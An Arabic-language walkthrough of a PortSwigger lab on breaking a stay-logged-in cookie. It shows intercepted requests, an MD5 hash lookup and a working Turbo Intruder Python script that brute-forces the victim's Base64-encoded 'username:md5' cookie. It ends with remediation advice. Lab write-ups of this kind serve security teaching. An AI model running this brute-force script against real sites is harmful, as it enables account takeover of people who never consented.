# [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

## **`الهدف`**
القيام بعمل `brute-force` علي الـ `cookie` الخاصة بحساب `carlos` وتسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

**`ملاحظة هامة جدًا:`** دالة تجزئة أحادية الاتجاه `one-way hash function` لا يمكن عمليًا عكسها/فك تشفيرها ولذلك فكلمة تشفير تعتبر تقنيًا غير صحيحة لأن كلمة تشفير تعني أنه يمكن عكسها وهذا لا يمكن أن يحدث مع الهاش، حيث أن المواقع/الأدوات التي تفك تشفيرها هي في الواقع لا تقوم بفك تشفير ولكنها فقط تقوم بعمل مقارنة لناتج الهاش مقارنة بالكلمات الشهيرة فيبدو الأمر وكأنه فك تشفير، ولكن للتسهيل فقط فأنا أقول في ملاحظاتى عبارات مثل كود مشفر أو فك تشفير ... الخ، ولكن الصحيح هو **`تجزئة أو عملية تجزئة.`**

سنقوم أولًا بتسجيل الدخول إلى حساب `wiener:peter` وتفعيل خيار `Stay logged in` واعتراض الـ `request` الثاني الذي يحدث تلقائيًا.
```http
GET /my-account?id=wiener HTTP/2
Host: 0aa6007b04472663806999df00a2000a.web-security-academy.net
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=88Bl7a3Vuj88SgH6De3iLrvL72aPfp3J
```

ونقوم بنسخ الكود المكتوب بجانب `stay-logged-in=` وهو `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

ونتوجه إلى `Burp Decoder` ونقوم بعمل `Decode` لهذا الكود بترميز `Base64` لنجد أن النتيجة هي `wiener:51dc30ddc473d43a6011e9ebba6ca770`

ونقوم بنسخ الجزء الثاني المشفر وبما أن الهاش لا يمكن فك تشفيره فهناك بعض الأدوات والمواقع التى تقوم بعمل مقارنة لناتج الهاش مقارنة بالكلمات الشهيرة مثل موقع **[crackstation](https://crackstation.net/)** وبمجرد وضع الكود بها `51dc30ddc473d43a6011e9ebba6ca770`.

سنجد ان النتيجة هي أن نوع التشفير هو `MD5` بالإضافة إلى أن الكلمة المشفرة هي `peter` وهي كلمة المرور الخاصة بنا .

لذلك سنقوم باستعمال سكريبت داخل إضافة/أداة `Turbo Intruder` على الـ `request` الذي قمنا باعتراضه في البداية ونقوم بتغير المسار إلى `/my-account?id=carlos`  وحذف الـ `Session` مع وضع علامة `%s` بدلًا من كود الـ `stay-logged-in=`الخاص بـ `wiener
```http
GET /my-account?id=carlos HTTP/2
Host: 0aa6007b04472663806999df00a2000a.web-security-academy.net
Cookie: stay-logged-in=%s
```

وهذا السكريبت يقوم بتشفير جميع كلمات المرور الموجودة في القائمة التي يوفرها موقع الـ `PortSwigger` ويقوم بوضعها بجانب `carlos:` وبعد ذلك يقوم بعمل ترميز `Base64` لكلاهما معًا، ثم يضع الناتج في الـ `request` ويقوم بإرساله، أي أنها العملية العكسية لما قمنا به في البداية مع  الكود المشفر الخاص بحساب `wiener`
```Python
import hashlib
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=2,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED)

    with open(r'C:\Users\test\Desktop\password.txt', 'r') as f:
        for line in f:
            word = line.strip()
            if not word:
                continue

            # 1. MD5 hash (لاحظ إننا بنستخدم encode عشان نضمن UTF-8)
            md5_hash = hashlib.md5(word.encode('utf-8')).hexdigest()

            # 2. دمج "carlos:" مع الهاش (باستخدام concatenation بدل f-string)
            combined = "carlos:" + md5_hash

            # 3. تشفير Base64
            final_payload = base64.b64encode(combined.encode('utf-8'))

            # إرسال القيمة النهائية
            engine.queue(target.req, final_payload)

def handleResponse(req, interesting):
    table.add(req)
```

وبملاحظة النتائج، سنجد أن هناك `request` واحد قد عاد برقم `200` في خانة الـ `Status code` وهذا يعنى أنه لم ينجح في عمل `Redirect` عكس البقية الذين كانوا برقم `302` والتي تعنى أنه قد تم عمل `Redirect`.

ولكي نفهم ذلك ففي حالتنا هذه نحن نريد الـ `request` برقم `200` لأن هذا يعنى أنه قد دخل لمسار حساب `carlos` بنجاح ولكن البقية بسبب عدم وجود هذا الكود المشفر فقد تم تحويلهم إلى مسار `/login` برقم `Redirect/302`.

فنقوم بنسخ هذا الكود المُشفر الخاص بـ `stay-logged-in=` من الـ `request` برقم `200` وهو `Y2FybG9zOmZjNjNmODdjMDhkNTA1MjY0Y2FiYTM3NTE0Y2QwY2Zk`
```http
GET /my-account?id=carlos HTTP/1.1
Host: 0aa6007b04472663806999df00a2000a.web-security-academy.net
Cookie: stay-logged-in=Y2FybG9zOmZjNjNmODdjMDhkNTA1MjY0Y2FiYTM3NTE0Y2QwY2Zk
```

ونقوم بالتوجه إلى المتصفح و ونضغط على زر `F12` في الكيبورد ونتوجه لخانة الـ `Cookies` ونغير الـ `stay-logged-in=` الموجودة بالتي حصلنا عليها، ولا ننسى أن نقوم بحذف الـ `Session` الموجودة الخاصة بحساب `wiener` وبعد ذلك نقوم بالتوجه إلى مسار `/my-account?id=carlos` لننتهي من حل اللاب.

ونستطيع أن نحل اللاب عن طريق القيام بفك تشفير لكود `carlos` بنفس الطريقة التى قمنا بفعلها مع الكود المشفر الخاص بـ`wiener` حتى نصل إلى كلمة المرور الخاصة به والتي يتضح أنها `nicole` ونقوم بتسجيل الدخول بشكل طبيعى إلى حساب `carlos:nicole` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب عدم تخزين بيانات حساسة مثل `username:password` داخل الـ `cookie` على جهاز المُستخدم حتى لو كانت مشفرة، ويكون الـ `Cookie` المُرسل للمُستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`،  يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم ويتم ربط المُستخدم به بشكل صارم في الواجهة الخلفية `back-end.`

ويجب حماية هذا الـ `Cookie` بتفعيل خصائص الأمان مثل `HttpOnly` لمنع سرقته عبر ثغرات الـ `XSS`، وخاصية `Secure` لضمان تشفيره عبر `HTTPS`، وخاصية `SameSite=Strict` أو `SameSite=Lax` لمنع هجمات الـ `CSRF`، حيث تضمن هذه الخاصية أن المتصفح لن يقوم بإرسال `cookie` الجلسة مع أي طلبات خارجية قادمة من مواقع أخرى،

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`

ويجب التوقف عن استعمال الـ `MD5` والتي تعتبر مكسورة أمنياً `Cryptographically Broken`(تبلغ سرعتها حوالي `100` مليار محاولة في الثانية الواحدة ) وعفا عليها الزمن، واستبدالها بنوعية حديثة ومُصممة خصيصاً لتأمين كلمات المرور مثل `Bcrypt` أو `Argon2` بحيث تستهلك وقت وموارد `CPU/RAM` (هذا البطء لا يؤثر على المستخدم العادي (يبلغ حوالي `0.5`  ثانية للمحاولة الواحدة)، لكنه يدمر قدرة المهاجم على تجربة ملايين الكلمات في الثانية مما يجعل كسرها أكثر صعوبة، مع التأكد من دمج `Salt` عشوائي وفريد لكل مستخدم قبل عملية التجزئة.

ويجب وضع قواعد لتمنع أى عضو من التسجيل بكلمات مرور سهلة وقصيرة، بحيث يتم إجبار الأعضاء على استعمال حد أدني مناسب من المحرفات `(Characters)`، وأن تشتمل كلمة المرور على رموز خاصة وأحرف كبيرة وصغيرة وأرقام.
